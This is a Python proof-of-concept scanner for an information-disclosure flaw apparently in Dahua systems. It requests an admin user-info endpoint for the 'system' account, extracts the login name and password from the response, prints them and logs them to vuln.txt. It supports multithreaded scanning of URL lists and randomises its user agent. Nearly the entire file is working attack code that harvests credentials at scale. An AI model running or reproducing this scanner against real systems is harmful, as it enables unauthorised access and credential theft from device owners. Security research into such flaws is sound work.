#-*- coding: utf-8 -*-

import requests
import sys
import urllib3
from argparse import ArgumentParser
import threadpool
from urllib import parse
from time import time
import random
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
url_list = []


# 随机ua
def get_ua():
    first_num = random.randint(55, 62)
    third_num = random.randint(0, 3200)
    fourth_num = random.randint(0, 140)
    os_type = [
        '(Windows NT 6.1; WOW64)', '(Windows NT 10.0; WOW64)',
        '(Macintosh; Intel Mac OS X 10_12_6)'
    ]
    chrome_version = 'Chrome/{}.0.{}.{}'.format(first_num, third_num, fourth_num)

    ua = ' '.join(['Mozilla/5.0', random.choice(os_type), 'AppleWebKit/537.36',
                   '(KHTML, like Gecko)', chrome_version, 'Safari/537.36']
                  )
    return ua


# 有漏洞的url写入文件
def wirte_targets(vurl, filename):
    with open(filename, "a+") as f:
        f.write(vurl + "\n")


def check_vuln(url):
    url = parse.urlparse(url)
    url1 = url.scheme + '://' + url.netloc
    url2 = url.scheme + '://' + url.netloc + '/admin/user_getUserInfoByUserName.action?userName=system'
    try:
        headers = {'User-Agent': get_ua(),
                   }
        res = requests.get(url2, headers=headers, allow_redirects=True, timeout=10, verify=False)
        if res.status_code == 200 and "loginPass" in res.text:
            loginname = re.findall(r'loginName":"(.*?)"', res.text, re.DOTALL)[0]
            loginpass = re.findall(r'loginPass":"(.*?)"', res.text, re.DOTALL)[0]
            print("\033[32m[+]{} is vulnerable. {}:{}\033[0m".format(url1, loginname, loginpass))
            wirte_targets(url2 + " " + loginname + ":" + loginpass, "vuln.txt")
        else:
            print("\033[31m[-]{} is no vulnerable\033[0m".format(url1))
    except Exception as e:
        print("[-]{} is timeout. {}\033[0m".format(url1, e))


# 多线程
def multithreading(url_list, pools=5):
    works = []
    for i in url_list:
        # works.append((func_params, None))
        works.append(i)
    # print(works)
    pool = threadpool.ThreadPool(pools)
    reqs = threadpool.makeRequests(check_vuln, works)
    [pool.putRequest(req) for req in reqs]
    pool.wait()


if __name__ == '__main__':
    show = r'''


________         .__                                      __                                                               
\______ \ _____  |  |__  __ _______          ____   _____/  |____________    ______ ______      ______ ____ _____    ____  
 |    |  \\__  \ |  |  \|  |  \__  \        / ___\_/ __ \   __\____ \__  \  /  ___//  ___/     /  ___// ___\\__  \  /    \ 
 |    `   \/ __ \|   Y  \  |  // __ \_     / /_/  >  ___/|  | |  |_> > __ \_\___ \ \___ \      \___ \\  \___ / __ \|   |  \
/_______  (____  /___|  /____/(____  /_____\___  / \___  >__| |   __(____  /____  >____  >____/____  >\___  >____  /___|  /
        \/     \/     \/           \/_____/_____/      \/     |__|       \/     \/     \/_____/    \/     \/     \/     \/ 
    
                                                     tag:DaHua_getpass_scan poc                                       
                                                     @version: 1.0.0   @author: csd
	'''
    print(show + '\n')
    arg = ArgumentParser(description='Dahua check vuln by csd')
    arg.add_argument("-u",
                     "--url",
                     help="Target URL; Example:python3 Dahua_systempass_scan.py -u http://www.example.com")
    arg.add_argument("-f",
                     "--file",
                     help="url_list; Example:python3 Dahua_systempass_scan.py -f url.txt")

    args = arg.parse_args()
    url = args.url
    filename = args.file
    if url != None and filename == None:
        check_vuln(url)
    elif url == None and filename != None:
        start = time()
        for i in open(filename):
            i = i.replace('\n', '')
            url_list.append(i)
        multithreading(url_list, 10)
        end = time()
        print('任务完成，用时{}s'.format(end - start))
